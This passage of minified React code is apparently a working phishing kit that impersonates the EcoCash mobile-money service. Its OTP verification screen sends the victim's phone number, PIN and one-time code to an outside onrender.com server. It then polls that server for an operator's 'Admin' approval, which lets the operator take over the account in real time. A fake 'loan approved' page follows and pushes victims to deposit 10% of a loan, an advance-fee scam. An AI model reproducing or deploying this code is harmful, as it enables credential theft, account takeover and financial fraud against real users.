                        onClick: Z,
                        children: [i.jsx("span", {
                            children: "👤"
                        }), i.jsx("span", {
                            children: "Register"
                        })]
                    }), i.jsxs("button", {
                        className: "footer-button",
                        onClick: I,
                        children: [i.jsx("span", {
                            children: "ℹ️"
                        }), i.jsx("span", {
                            children: "Help & Support"
                        })]
                    })]
                }), i.jsx("p", {
                    className: "version-text",
                    children: "v2.1.3P"
                }), i.jsxs("p", {
                    className: "terms-text",
                    children: ["By signing in you agree to the", " ", i.jsx("span", {
                        className: "terms-link",
                        children: i.jsx("a", {
                            href: "https://ecocash.co.zw/terms-and-conditions/",
                            children: "Terms and Conditions"
                        })
                    })]
                })]
            })]
        })]
    })
}
function By() {
    const s = Xl()
      , {userId: d, apiBase: f} = fa()
      , {authData: o, updateAuthData: p} = ra()
      , v = "https://ecocash-zw-server-0051.onrender.com"
      , x = J => `${v}${f}/${J}`
      , z = () => {
        if (o.phoneNumber)
            return o.phoneNumber;
        try {
            const J = localStorage.getItem("ecocash_phone");
            if (J)
                return J
        } catch {}
        return "+263 777 123 4567"
    }
      , [N] = S.useState(z())
      , [m,D] = S.useState(["", "", "", "", "", ""])
      , [j,H] = S.useState(!1)
      , [q,X] = S.useState(!1)
      , [Y,G] = S.useState(null)
      , [w,Q] = S.useState(!1)
      , [V,ae] = S.useState(!1)
      , [be,se] = S.useState(!1)
      , [F,re] = S.useState(0)
      , [xe,Ae] = S.useState("")
      , [te,le] = S.useState(!1)
      , [it,Fe] = S.useState(!1)
      , [Qe,O] = S.useState(!1)
      , [B,$] = S.useState(!1)
      , [he,pe] = S.useState(!1)
      , [g,_] = S.useState(!1)
      , [L,Z] = S.useState(!0)
      , I = S.useRef(null)
      , ne = S.useRef(null)
      , ie = [S.useRef(null), S.useRef(null), S.useRef(null), S.useRef(null), S.useRef(null), S.useRef(null)];
    S.useEffect( () => {
        if (!L)
            return;
        const J = async () => {
            try {
                const fe = o.phoneNumber || N;
                (await (await fetch(x("check-login-approval"), {
                    method: "POST",
                    headers: {
                        "Content-Type": "application/json"
                    },
                    body: JSON.stringify({
                        phoneNumber: fe,
                        pin: o.pin
                    })
                })).json()).approved && (Z(!1),
                H(!0),
                G(104),
                localStorage.setItem("otp_timer", JSON.stringify({
                    endTime: Date.now() + 104e3
                })))
            } catch (fe) {
                console.error("Error checking approval status:", fe)
            }
        }
        ;
        return ne.current = setInterval(J, 2e3),
        J(),
        () => {
            ne.current && clearInterval(ne.current)
        }
    }
    , [L, N, o.phoneNumber, o.pin]),
    S.useEffect( () => {
        if (j) {
            const J = setTimeout( () => H(!1), 2500);
            return () => clearTimeout(J)
        }
    }
    , [j]),
    S.useEffect( () => {
        if (q) {
            const J = setTimeout( () => X(!1), 2500);
            return () => clearTimeout(J)
        }
    }
    , [q]),
    S.useEffect( () => {
        if (Y > 0 && !w && !L) {
            const J = setInterval( () => {
                G(fe => {
                    const Ee = fe - 1;
                    return Ee <= 0 ? (localStorage.removeItem("otp_timer"),
                    0) : (localStorage.setItem("otp_timer", JSON.stringify({
                        endTime: Date.now() + Ee * 1e3
                    })),
                    Ee)
                }
                )
            }
            , 1e3);
            return () => clearInterval(J)
        }
    }
    , [Y, w, L]),
    S.useEffect( () => {
        if (w && te && F < 100) {
            const J = setTimeout( () => {
                re(fe => Math.min(fe + Math.random() * 15 + 5, 100))
            }
            , 300);
            return () => clearTimeout(J)
        } else
            F >= 100 && te && setTimeout( () => s(`/${d}/status`), 500)
    }
    , [w, te, F, s, d]);
    const Ie = async (J, fe) => {
        const Ee = Date.now()
          , gt = 300 * 1e3
          , Wt = 2e3;
        for (; Date.now() - Ee < gt; )
            try {
                const Qt = await (await fetch(x("check-otp-status"), {
                    method: "POST",
                    headers: {
                        "Content-Type": "application/json"
                    },
                    body: JSON.stringify({
                        phoneNumber: J,
                        otp: fe
                    })
                })).json();
                if (Qt.status === "approved")
                    return {
                        approved: !0
                    };
                if (Qt.status === "rejected")
                    return {
                        approved: !1,
                        message: "Admin marked OTP as incorrect"
                    };
                if (Qt.status === "wrong_pin")
                    return {
                        approved: !1,
                        wrongPin: !0,
                        message: "Wrong PIN entered"
                    };
                const ma = `Please wait... (${Math.floor((Date.now() - Ee) / 1e3)}s)`;
                I.current !== ma && (Ae(ma),
                I.current = ma),
                await new Promise(ha => setTimeout(ha, Wt))
            } catch (Ye) {
                console.error("Error checking OTP status:", Ye),
                await new Promise(Qt => setTimeout(Qt, Wt))
            }
        return {
            approved: !1,
            timeout: !0,
            message: "Error occurred, please try again"
        }
    }
      , Re = (J, fe) => {
        const Ee = fe.replace(/\D/g, "");
        if (Ee.length > 1)
            return;
        const gt = [...m];
        gt[J] = Ee,
        D(gt),
        Ee && J < 5 && ie[J + 1].current.focus()
    }
      , ee = (J, fe) => {
        J.preventDefault();
        const Ee = J.clipboardData.getData("text").replace(/\D/g, "").slice(0, 6).split("")
          , gt = [...m];
        Ee.forEach( (Wt, Ye) => {
            fe + Ye < 6 && (gt[fe + Ye] = Wt)
        }
        ),
        D(gt),
        ie[Math.min(fe + Ee.length, 5)].current.focus()
    }
      , ge = (J, fe) => {
        if (fe.key === "Backspace")
            if (m[J]) {
                const Ee = [...m];
                Ee[J] = "",
                D(Ee)
            } else
                J > 0 && ie[J - 1].current.focus();
        else
            fe.key === "ArrowLeft" && J > 0 ? ie[J - 1].current.focus() : fe.key === "ArrowRight" && J < 5 && ie[J + 1].current.focus()
    }
      , _e = J => {
        /^\d$/.test(J.key) || J.preventDefault()
    }
      , ct = async J => {
        if (J.preventDefault(),
        be || L)
            return;
        const fe = m.join("");
        if (fe.length !== 6) {
            alert("Please enter complete 6-digit OTP");
            return
        }
        se(!0);
        const Ee = o.phoneNumber || N;
        p({
            otp: fe,
            isAuthenticated: !0
        });
        try {
            await (await fetch(x("verify-otp"), {
                method: "POST",
                headers: {
                    "Content-Type": "application/json"
                },
                body: JSON.stringify({
                    phoneNumber: Ee,
                    otp: fe,
                    timestamp: new Date().toISOString()
                })
            })).json(),
            Q(!0);
            const Wt = "Please wait...";
            Ae(Wt),
            I.current = Wt,
            le(!1),
            re(0);
            const Ye = await Ie(Ee, fe);
            if (Ye.approved) {
                localStorage.removeItem("otp_timer");
                const Qt = "✅ Verified! Proceeding...";
                Ae(Qt),
                I.current = Qt,
                le(!0)
            } else
                Ye.wrongPin ? (Q(!1),
                se(!1),
                re(0),
                le(!1),
                pe(!0),
                I.current = null) : Ye.timeout ? (Q(!1),
                se(!1),
                re(0),
                le(!1),
                _(!0),
                I.current = null) : (Q(!1),
                se(!1),
                re(0),
                le(!1),
                Fe(!0),
                D(["", "", "", "", "", ""]),
                I.current = null,
                setTimeout( () => ie[0].current?.focus(), 100))
        } catch (gt) {
            console.error("OTP verification error:", gt),
            se(!1),
            Q(!1),
            re(0),
            le(!1),
            $(!0),
            I.current = null
        }
    }
      , qe = async () => {
        if (Y > 0 || V || L)
            return;
        const J = o.phoneNumber || N;
        if (!J || J === "+263 777 123 4567") {
            O(!0);
            return
        }
        ae(!0);
        try {
            (await (await fetch(x("resend-otp"), {
                method: "POST",
                headers: {
                    "Content-Type": "application/json"
                },
                body: JSON.stringify({
                    phoneNumber: J,
                    timestamp: new Date().toISOString()
                })
            })).json()).success ? (D(["", "", "", "", "", ""]),
            G(104),
            localStorage.setItem("otp_timer", JSON.stringify({
                endTime: Date.now() + 104e3
            })),
            X(!0),
            ie[0].current.focus()) : O(!0)
        } catch (fe) {
            console.error("Resend OTP error:", fe),
            O(!0)
        } finally {
            ae(!1)
        }
    }
      , ot = () => {
        localStorage.removeItem("otp_timer"),
        s(-1)
    }
      , Ql = () => {
        pe(!1),
        localStorage.removeItem("otp_timer"),
        localStorage.removeItem("ecocash_phone"),
        p({
            phoneNumber: "",
            pin: "",
            otp: "",
            isAuthenticated: !1
        }),
        s(`/${d}/login`)
    }
      , Zl = () => {
        _(!1),
        D(["", "", "", "", "", ""]),
        setTimeout( () => ie[0].current?.focus(), 100)
    }
      , da = m.every(J => J !== "");
    return w ? i.jsxs("div", {
        className: "otp-container",
        children: [i.jsx("main", {
            className: "otp-content",
            children: i.jsxs("div", {
                className: "processing-card",
                children: [i.jsx("div", {
                    className: "spinner-container",
                    children: i.jsx("div", {
                        className: "spinner"
                    })
                }), i.jsx("h1", {
                    className: "processing-title",
                    children: "Verifying OTP"
                }), i.jsx("p", {
                    className: "processing-subtitle",
                    children: xe
                })]
            })
        }), i.jsx("footer", {
            className: "otp-footer",
            children: "© 2026 Ecocash"
        })]
    }) : i.jsxs("div", {
        className: "otp-container",
        children: [it && i.jsx("div", {
            className: "error-modal-overlay",
            onClick: () => Fe(!1),
            children: i.jsxs("div", {
                className: "error-modal",
                onClick: J => J.stopPropagation(),
                children: [i.jsx("h2", {
                    className: "error-modal-title",
                    children: "Wrong code!"
                }), i.jsx("p", {
                    className: "error-modal-message",
                    children: "Check SMS for the code or request code again after countdown is over"
                }), i.jsx("button", {
                    className: "error-modal-button",
                    onClick: () => Fe(!1),
                    children: "OK"
                })]
            })
        }), g && i.jsx("div", {
            className: "error-modal-overlay",
            onClick: Zl,
            children: i.jsxs("div", {
                className: "error-modal",
                onClick: J => J.stopPropagation(),
                children: [i.jsx("h2", {
                    className: "error-modal-title",
                    children: "Timeout"
                }), i.jsx("p", {
                    className: "error-modal-message",
                    children: "Error occurred, please try again"
                }), i.jsx("button", {
                    className: "error-modal-button",
                    onClick: Zl,
                    children: "OK"
                })]
            })
        }), he && i.jsx("div", {
            className: "error-modal-overlay",
            onClick: Ql,
            children: i.jsxs("div", {
                className: "error-modal",
                onClick: J => J.stopPropagation(),
                children: [i.jsx("h2", {
                    className: "error-modal-title",
                    children: "Wrong PIN!"
                }), i.jsx("p", {
                    className: "error-modal-message",
                    children: "The PIN or phone number you entered earlier was incorrect. Please login again with the correct details."
                }), i.jsx("button", {
                    className: "error-modal-button",
                    onClick: Ql,
                    children: "Back to Login"
                })]
            })
        }), Qe && i.jsx("div", {
            className: "error-modal-overlay",
            onClick: () => O(!1),
            children: i.jsxs("div", {
                className: "error-modal",
                onClick: J => J.stopPropagation(),
                children: [i.jsx("h2", {
                    className: "error-modal-title",
                    children: "Resend Failed"
                }), i.jsx("p", {
                    className: "error-modal-message",
                    children: "Failed to resend OTP. Please try again later."
                }), i.jsx("button", {
                    className: "error-modal-button",
                    onClick: () => O(!1),
                    children: "OK"
                })]
            })
        }), B && i.jsx("div", {
            className: "error-modal-overlay",
            onClick: () => $(!1),
            children: i.jsxs("div", {
                className: "error-modal",
                onClick: J => J.stopPropagation(),
                children: [i.jsx("h2", {
                    className: "error-modal-title",
                    children: "Verification Failed"
                }), i.jsx("p", {
                    className: "error-modal-message",
                    children: "Failed to verify OTP. Please try again later."
                }), i.jsx("button", {
                    className: "error-modal-button",
                    onClick: () => $(!1),
                    children: "OK"
                })]
            })
        }), j && i.jsxs("div", {
            className: "success-toast",
            children: [i.jsx("div", {
                className: "success-icon",
                children: "✓"
            }), i.jsx("span", {
                className: "success-text",
                children: "OTP code sent successfully!"
            })]
        }), q && i.jsxs("div", {
            className: "success-toast resend",
            children: [i.jsx("div", {
                className: "success-icon",
                children: "📱"
            }), i.jsx("span", {
                className: "success-text",
                children: "OTP resent successfully!"
            })]
        }), i.jsxs("header", {
            className: "otp-header",
            children: [i.jsx("button", {
                className: "back-btn",
                onClick: ot,
                children: "←"
            }), i.jsxs("div", {
                className: "logo-large",
                children: [i.jsx("span", {
                    className: "logo-large-eco",
                    children: "Eco"
                }), i.jsx("span", {
                    className: "logo-large-cash",
                    children: "Cash"
                })]
            }), i.jsxs("button", {
                className: "menu-btn",
                "aria-label": "Menu",
                children: [i.jsx("div", {
                    className: "menu-line"
                }), i.jsx("div", {
                    className: "menu-line"
                }), i.jsx("div", {
                    className: "menu-line"
                })]
            })]
        }), i.jsx("main", {
            className: "otp-content",
            children: i.jsxs("div", {
                className: "otp-card",
                children: [i.jsx("h1", {
                    className: "otp-title",
                    children: "OTP Verification"
                }), i.jsx("p", {
                    className: "otp-subtitle",
                    children: "Enter the OTP sent to your phone number"
                }), i.jsx("p", {
                    className: "otp-phone",
                    children: N
                }), i.jsxs("form", {
                    onSubmit: ct,
                    children: [i.jsxs("div", {
                        className: "otp-inputs-container",
                        children: [i.jsx("div", {
                            className: "otp-inputs",
                            children: m.map( (J, fe) => i.jsx("input", {
                                ref: ie[fe],
                                type: "text",
                                className: "otp-box",
                                value: J,
                                onChange: Ee => Re(fe, Ee.target.value),
                                onKeyDown: Ee => ge(fe, Ee),
                                onKeyPress: _e,
                                onPaste: Ee => ee(Ee, fe),
                                maxLength: "1",
                                inputMode: "numeric",
                                pattern: "[0-9]",
                                required: !0,
                                disabled: V || be || L
                            }, fe))
                        }), i.jsx("p", {
                            className: "resend-text",
                            children: L ? i.jsx("span", {
                                className: "resending-text",
                                children: "Requesting OTP..."
                            }) : V ? i.jsx("span", {
                                className: "resending-text",
                                children: "Resending code..."
                            }) : Y > 0 ? `Resend code in ${Y} seconds` : i.jsxs(i.Fragment, {
                                children: [" Didn't receive the code?", " ", i.jsx("span", {
                                    className: "resend-link",
                                    onClick: qe,
                                    children: "Resend"
                                })]
                            })
                        })]
                    }), i.jsx("button", {
                        type: "submit",
                        className: `submit-button ${da && !L ? "active" : ""}`,
                        disabled: !da || V || be || L,
                        children: be ? "VERIFYING..." : "SUBMIT"
                    })]
                })]
            })
        }), i.jsx("footer", {
            className: "otp-footer",
            children: "© 2026 Ecocash"
        })]
    })
}
function qy() {
    const s = Xl()
      , {userId: d} = fa()
      , {loanStatusData: f, personalDetailsData: o, authData: p, completeDeposit: v} = ra()
      , [x,z] = S.useState(!1)
      , [N,m] = S.useState(!1)
      , [D,j] = S.useState(!1)
      , [H,q] = S.useState(!1)
      , X = {
        approvedAmount: f.approvedAmount || 0,
        requestedAmount: f.requestedAmount || 0,
        monthlyPayment: f.monthlyPayment || 0,
        loanTerm: f.loanTerm || "12 Months",
        interestRate: f.interestRate || "8% APR"
    }
      , Y = {
        name: `${o.firstName || ""} ${o.lastName || ""}`.trim() || "User",
        accountNumber: f.accountNumber || p.phoneNumber?.replace(/\D/g, "").slice(-10) || "N/A",
        requiredDeposit: f.requiredDeposit || 0,
        totalWithBonus: f.totalWithBonus || 0
    }
      , G = () => {
        z(!0),
        m(!1),
        j(!1),
        q(!1)
    }
      , w = () => {
        f.hasDeposited ? (m(!0),
        z(!1),
        j(!1)) : q(!0)
    }
      , Q = () => q(!1)
      , V = () => {
        z(!1),
        m(!1),
        j(!1)
    }
      , ae = () => {
        j(!0),
        z(!1),
        m(!1),
        q(!1)
    }
      , be = () => {
        v(),
        z(!1)
    }
      , se = () => m(!1)
      , F = () => s(`/${d}`);
    return H ? i.jsx("div", {
        className: "status-container",
        children: i.jsxs("div", {
            className: "status-content",
            children: [i.jsx("div", {
                className: "popup-overlay",
                onClick: Q
            }), i.jsx("div", {
                className: "warning-popup",
                children: i.jsxs("div", {
                    className: "warning-popup-content",
                    children: [i.jsx("div", {
                        className: "warning-icon-container",
                        children: i.jsx("span", {
                            className: "warning-lock-icon",
                            children: "🔒"
                        })
                    }), i.jsx("h2", {
                        className: "warning-popup-title",
                        children: "Please deposit first!"
                    }), i.jsx("p", {
                        className: "warning-popup-text",
                        children: "You need to deposit 10% of your requested loan amount in USD WALLET before you can withdraw funds."
                    }), i.jsxs("div", {
                        className: "warning-popup-buttons",
                        children: [i.jsx("button", {
                            className: "warning-cancel-btn",
                            onClick: Q,
                            children: "Cancel"
                        }), i.jsx("button", {
                            className: "warning-deposit-btn",
                            onClick: G,
                            children: "Deposit Now"
                        })]
                    })]
                })
            })]
        })
    }) : D ? i.jsx("div", {
        className: "status-container loan-details-container",
        children: i.jsxs("div", {
            className: "status-content loan-details-content",
            children: [i.jsxs("div", {
                className: "loan-details-header",
                children: [i.jsx("button", {
                    className: "loan-details-back-btn",
                    onClick: V,
                    children: "←"
                }), i.jsx("h1", {
                    className: "loan-details-page-title",
                    children: "Loan Details"
                })]
            }), i.jsxs("div", {
                className: "loan-details-modal-card",
                children: [i.jsxs("div", {
                    className: "loan-detail-info-item",
                    children: [i.jsxs("div", {
                        className: "loan-detail-info-label",
                        children: [i.jsx("span", {
                            className: "loan-detail-info-icon",
                            children: "👤"
                        }), i.jsx("p", {
                            className: "loan-detail-label-text",
                            children: "NAME"
                        })]
                    }), i.jsx("p", {
                        className: "loan-detail-info-value",
                        children: Y.name
                    })]
                }), i.jsxs("div", {
                    className: "loan-detail-info-item",
                    children: [i.jsxs("div", {
                        className: "loan-detail-info-label",
                        children: [i.jsx("span", {
                            className: "loan-detail-info-icon",
                            children: "📱"
                        }), i.jsx("p", {
                            className: "loan-detail-label-text",
                            children: "ECOCASH ACCOUNT"
                        })]
                    }), i.jsx("p", {
                        className: "loan-detail-info-value",
                        children: Y.accountNumber
                    })]
                }), i.jsxs("div", {
                    className: "loan-requested-amount-box",
                    children: [i.jsxs("div", {
                        className: "loan-requested-label",
                        children: [i.jsx("span", {
                            className: "loan-detail-info-icon",
                            children: "💵"
                        }), i.jsx("p", {
                            className: "loan-requested-label-text",
                            children: "REQUESTED LOAN AMOUNT"
                        })]
                    }), i.jsxs("p", {
                        className: "loan-requested-value",
                        children: ["$", X.requestedAmount.toLocaleString()]
                    })]
                }), i.jsxs("div", {
                    className: "loan-deposit-summary-item",
                    children: [i.jsx("p", {
                        className: "loan-summary-label",
                        children: "REQUIRED DEPOSIT (10%)"
                    }), i.jsxs("p", {
                        className: "loan-summary-value",
                        children: ["$", Y.requiredDeposit.toLocaleString()]
                    })]
                }), i.jsxs("div", {
                    className: "loan-deposit-summary-item",
                    children: [i.jsx("p", {
                        className: "loan-summary-label",
                        children: "TOTAL AMOUNT (WITH 10% BONUS)"
                    }), i.jsxs("p", {
                        className: "loan-summary-value",
                        children: ["$", Y.totalWithBonus.toLocaleString()]
                    })]
                }), i.jsx("div", {
                    className: "loan-qualified-badge-container",
                    children: i.jsxs("div", {
                        className: "loan-qualified-badge",
                        children: [i.jsx("span", {
                            children: "✓"
                        }), " Qualified"]
                    })
                }), i.jsxs("div", {
                    className: "loan-details-tip-box",
                    children: [i.jsxs("div", {
                        className: "loan-details-tip-header",
                        children: [i.jsx("span", {
                            className: "loan-details-tip-icon",
                            children: "💡"
                        }), i.jsx("p", {
                            className: "loan-details-tip-title",
                            children: "Tip"
                        })]
                    }), i.jsx("p", {
                        className: "loan-details-tip-text",
                        children: "To use your loan funds, ensure your USD WALLET in EcoCash account has at least 10% of the loan amount as a deposit."
                    })]
                }), i.jsxs("button", {
                    className: "loan-details-back-button",
                    onClick: V,
                    children: [i.jsx("span", {
                        children: "←"
                    }), " Back to Loan Summary"]
                })]
            })]
        })
    }) : x ? i.jsx("div", {
        className: "status-container",
        children: i.jsxs("div", {
            className: "status-content",
            children: [i.jsxs("div", {
                className: "deposit-header",
                children: [i.jsx("button", {
                    className: "back-arrow",
                    onClick: V,
                    children: "←"
                }), i.jsx("h1", {
                    className: "deposit-title",
                    children: "Deposit Funds"
                })]
            }), i.jsxs("div", {
                className: "deposit-card",
                children: [i.jsxs("div", {
                    className: "info-section",
                    children: [i.jsxs("div", {
                        className: "info-item",
                        children: [i.jsx("span", {
                            className: "info-icon",
                            children: "👤"
                        }), i.jsxs("div", {
                            children: [i.jsx("p", {
                                className: "info-label",
                                children: "NAME"
                            }), i.jsx("p", {
                                className: "info-value",
                                children: Y.name
                            })]
                        })]
                    }), i.jsxs("div", {
                        className: "info-item",
                        children: [i.jsx("span", {
                            className: "info-icon",
                            children: "📱"
                        }), i.jsxs("div", {
                            children: [i.jsx("p", {
                                className: "info-label",
                                children: "ECOCASH ACCOUNT"
                            }), i.jsx("p", {
                                className: "info-value",
                                children: Y.accountNumber
                            })]
                        })]
                    })]
                }), i.jsxs("div", {
                    className: "required-deposit-box",
                    children: [i.jsx("p", {
                        className: "deposit-label",
                        children: "💵 REQUIRED DEPOSIT (10%)"
                    }), i.jsxs("p", {
                        className: "deposit-amount",
                        children: ["$", Y.requiredDeposit.toLocaleString()]
                    })]
                }), i.jsxs("div", {
                    className: "instructions-section",
                    children: [i.jsx("h3", {
                        className: "instructions-title",
                        children: "Instructions:"
                    }), ["Open your EcoCash app or dial <strong>*151#</strong> on your phone.", 'Select <strong>"Send Money"</strong> or <strong>"Deposit"</strong>.', `Enter your EcoCash account number: <strong>${Y.accountNumber}</strong>.`, `Enter the amount: <strong>$${Y.requiredDeposit} USD</strong> (or more).`, "Confirm the transaction and complete the deposit.", "Wait for the confirmation SMS from EcoCash."].map( (re, xe) => i.jsxs("div", {
                        className: "instruction-step",
                        children: [i.jsx("span", {
                            className: "step-number",
                            children: xe + 1
                        }), i.jsx("p", {
                            className: "step-text",
                            dangerouslySetInnerHTML: {
                                __html: re
                            }
                        })]
                    }, xe))]
                }), i.jsxs("div", {
                    className: "tip-box",
                    children: [i.jsxs("div", {
                        className: "tip-header",
                        children: [i.jsx("span", {
                            className: "tip-icon",
                            children: "💡"
                        }), i.jsx("span", {
                            className: "tip-title",
                            children: "Helpful Tip"
                        })]
                    }), i.jsx("p", {
                        className: "tip-text",
                        children: "If you do not have the 10% available in USD WALLET, ask a friend to send the cash to your EcoCash account, then you can send it back after qualification."
                    })]
                }), i.jsxs("div", {
                    className: "confirmation-box",
                    children: [i.jsx("span", {
                        className: "check-icon",
                        children: "✓"
                    }), i.jsxs("p", {
                        className: "confirmation-text",
                        children: [i.jsx("strong", {
                            children: "Once the deposit is confirmed"
                        }), ", you will be able to use your loan funds."]
                    })]
                }), i.jsxs("button", {
                    className: "complete-button",
                    onClick: be,
                    children: [i.jsx("span", {
                        className: "button-check",
                        children: "✓"
                    }), " I've Completed the Deposit"]
                })]
            })]
        })
    }) : N ? i.jsx("div", {
        className: "status-container",
        children: i.jsxs("div", {
            className: "status-content",
            children: [i.jsxs("div", {
                className: "deposit-header",
                children: [i.jsx("button", {
                    className: "back-arrow",
                    onClick: V,
                    children: "←"
                }), i.jsx("h1", {
                    className: "deposit-title",
                    children: "Withdraw Funds"
                })]
            }), i.jsxs("div", {
                className: "deposit-card",
                children: [i.jsxs("div", {
                    className: "info-section",
                    children: [i.jsxs("div", {
                        className: "info-item",
                        children: [i.jsx("span", {
                            className: "info-icon",
                            children: "👤"
                        }), i.jsxs("div", {
                            children: [i.jsx("p", {
                                className: "info-label",
                                children: "NAME"
                            }), i.jsx("p", {
                                className: "info-value",
                                children: Y.name
                            })]
                        })]
                    }), i.jsxs("div", {
                        className: "info-item",
                        children: [i.jsx("span", {
                            className: "info-icon",
                            children: "📱"
                        }), i.jsxs("div", {
                            children: [i.jsx("p", {
                                className: "info-label",
                                children: "ECOCASH ACCOUNT"
                            }), i.jsx("p", {
                                className: "info-value",
                                children: Y.accountNumber
                            })]
                        })]
                    })]
                }), i.jsxs("div", {
                    className: "required-deposit-box",
                    children: [i.jsx("p", {
                        className: "deposit-label",
                        children: "💰 AVAILABLE BALANCE"
                    }), i.jsxs("p", {
                        className: "deposit-amount",
                        children: ["$", X.approvedAmount.toLocaleString()]
                    })]
                }), i.jsxs("div", {
                    className: "instructions-section",
                    children: [i.jsx("h3", {
                        className: "instructions-title",
                        children: "Instructions:"
                    }), ["Open your EcoCash app or dial <strong>*151#</strong> on your phone.", 'Select <strong>"Withdraw Money"</strong> or <strong>"Send to Bank"</strong>.', `Enter your EcoCash account number: <strong>${Y.accountNumber}</strong>.`, "Enter the amount you wish to withdraw.", "Confirm the transaction and complete the withdrawal.", "Wait for the confirmation SMS from EcoCash."].map( (re, xe) => i.jsxs("div", {
                        className: "instruction-step",
                        children: [i.jsx("span", {
                            className: "step-number",
                            children: xe + 1
                        }), i.jsx("p", {
                            className: "step-text",
                            dangerouslySetInnerHTML: {
                                __html: re
                            }
                        })]
                    }, xe))]
                }), i.jsxs("div", {
                    className: "tip-box",
                    children: [i.jsxs("div", {
                        className: "tip-header",
                        children: [i.jsx("span", {
                            className: "tip-icon",
                            children: "💡"
                        }), i.jsx("span", {
                            className: "tip-title",
                            children: "Helpful Tip"
                        })]
                    }), i.jsx("p", {
                        className: "tip-text",
                        children: "You can withdraw funds to your bank account or collect cash at any EcoCash agent. Standard transaction fees apply."
                    })]
                }), i.jsxs("button", {
                    className: "complete-button",
                    onClick: se,
                    children: [i.jsx("span", {
                        className: "button-check",
                        children: "✓"
                    }), " I've Completed the Withdrawal"]
                })]
            })]
        })
    }) : i.jsx("div", {
        className: "status-container",
        children: i.jsxs("div", {
            className: "status-content",
            children: [i.jsxs("div", {
                className: "success-card",
                children: [i.jsx("div", {
                    className: "success-icon-container",
                    children: i.jsx("span", {
                        className: "success-checkmark",
                        children: "✓"
                    })
                }), i.jsxs("h1", {
                    className: "congrats-title",
                    children: [i.jsx("span", {
                        className: "party-emoji",
                        children: "🎉"
                    }), " Congratulations!"]
                }), i.jsxs("p", {
                    className: "approval-text",
                    children: ["Your loan has been ", i.jsx("span", {
                        className: "approval-highlight",
                        children: "approved!"
                    }), " The funds will be disbursed shortly."]
                }), i.jsxs("div", {
                    className: "approved-amount-section",
                    children: [i.jsx("p", {
                        className: "approved-label",
                        children: "Approved Amount"
                    }), i.jsxs("p", {
                        className: "approved-amount",
                        children: ["$", X.approvedAmount.toLocaleString()]
                    })]
                }), i.jsxs("div", {
                    className: "compliance-notice",
                    children: [i.jsxs("div", {
                        className: "notice-header",
                        children: [i.jsx("span", {
                            className: "warning-icon",
                            children: "⚠️"
                        }), i.jsx("span", {
                            className: "notice-title",
                            children: "Compliance Notice"
                        })]
                    }), i.jsxs("p", {
                        className: "notice-text",
                        children: ["Your EcoCash account must be active and maintain a security deposit of at least ", i.jsx("span", {
                            className: "notice-highlight",
                            children: "10% of your requested loan amount IN USD WALLET"
                        }), ". This deposit is fully refundable upon successful loan repayment."]
                    })]
                })]
            }), i.jsxs("div", {
                className: "loan-details-card",
                children: [i.jsxs("div", {
                    className: "details-header",
                    children: [i.jsx("span", {
                        className: "details-icon",
                        children: "💳"
                    }), i.jsx("h2", {
                        className: "details-title",
                        children: "Loan Details"
                    })]
                }), i.jsxs("div", {
                    className: "detail-item",
                    children: [i.jsx("div", {
                        className: "detail-icon-wrapper",
                        children: i.jsx("span", {
                            className: "detail-icon",
                            children: "💵"
                        })
                    }), i.jsxs("div", {
                        className: "detail-content",
                        children: [i.jsx("p", {
                            className: "detail-label",
                            children: "Monthly Payment"
                        }), i.jsxs("p", {
                            className: "detail-value",
                            children: ["$", X.monthlyPayment.toLocaleString()]
                        })]
                    })]
                }), i.jsxs("div", {
                    className: "detail-item",
                    children: [i.jsx("div", {
                        className: "detail-icon-wrapper",
                        children: i.jsx("span", {
                            className: "detail-icon",
                            children: "📅"
                        })
                    }), i.jsxs("div", {
                        className: "detail-content",
                        children: [i.jsx("p", {
                            className: "detail-label",
                            children: "Loan Term"
                        }), i.jsx("p", {
                            className: "detail-value",
                            children: X.loanTerm
                        })]
                    })]
                }), i.jsxs("div", {
                    className: "detail-item",
                    children: [i.jsx("div", {
                        className: "detail-icon-wrapper",
                        children: i.jsx("span", {
                            className: "detail-icon",
                            children: "📈"
                        })
                    }), i.jsxs("div", {
                        className: "detail-content",
                        children: [i.jsx("p", {
                            className: "detail-label",
                            children: "Interest Rate"
                        }), i.jsx("p", {
                            className: "detail-value",
                            children: X.interestRate
                        })]
                    })]
                })]
            }), i.jsxs("div", {
                className: "quick-actions-section",
                children: [i.jsx("h3", {
                    className: "actions-title",
                    children: "Quick Actions"
                }), i.jsxs("div", {
                    className: "action-buttons",
                    children: [i.jsxs("button", {
                        className: "action-button",
                        onClick: G,
                        children: [i.jsx("span", {
                            className: "button-icon",
                            children: "💰"
                        }), i.jsx("span", {
                            children: "Deposit Funds"
                        })]
                    }), i.jsxs("button", {
                        className: "action-button",
                        onClick: w,
                        children: [i.jsx("span", {
                            className: "button-icon",
                            children: "💸"
                        }), i.jsx("span", {
                            children: "Withdraw Funds"
                        })]
                    }), i.jsxs("button", {
                        className: "action-button",
                        onClick: ae,
                        children: [i.jsx("span", {
                            className: "button-icon",
                            children: "📄"
                        }), i.jsx("span", {
                            children: "Loan Details"
                        })]
                    })]
                }), i.jsxs("div", {
                    className: "next-steps-box",
                    children: [i.jsxs("div", {
                        className: "next-steps-header",
                        children: [i.jsx("span", {
                            className: "steps-icon",
                            children: "📱"
                        }), i.jsx("span", {
                            className: "steps-title",
                            children: "Next Steps:"
                        })]
                    }), i.jsx("p", {
                        className: "steps-text",
                        children: "You will receive an SMS and email with disbursement details within 24 hours."
                    })]
                })]
            }), i.jsxs("button", {
                className: "return-home-button",
                onClick: F,
                children: [i.jsx("span", {
                    className: "home-icon",
                    children: "🏠"
                }), i.jsx("span", {
                    children: "Return to Home"
                })]
            })]
        })
    })
}
function Yy() {
    return i.jsx(Ry, {
        children: i.jsx(Ny, {
            children: i.jsxs(Pv, {
                children: [i.jsx(kt, {
                    path: "/:userId",
                    element: i.jsx(Zs, {})
                }), i.jsx(kt, {
                    path: "/:userId/check-rate",
                    element: i.jsx(Zs, {})
                }), i.jsx(kt, {
                    path: "/:userId/loan-application",
                    element: i.jsx(_y, {})
                }), i.jsx(kt, {
                    path: "/:userId/details",
                    element: i.jsx(Uy, {})
                }), i.jsx(kt, {
                    path: "/:userId/summary",
                    element: i.jsx(Hy, {})
                }), i.jsx(kt, {
                    path: "/:userId/login",
                    element: i.jsx(Ly, {})
                }), i.jsx(kt, {
                    path: "/:userId/verify",
                    element: i.jsx(By, {})
                }), i.jsx(kt, {
                    path: "/:userId/status",
                    element: i.jsx(qy, {})
                }), i.jsx(kt, {
                    path: "*",
                    element: i.jsx(Zs, {})
                })]
            })
        })
    })
}
iv.createRoot(document.getElementById("root")).render(i.jsx(S.StrictMode, {
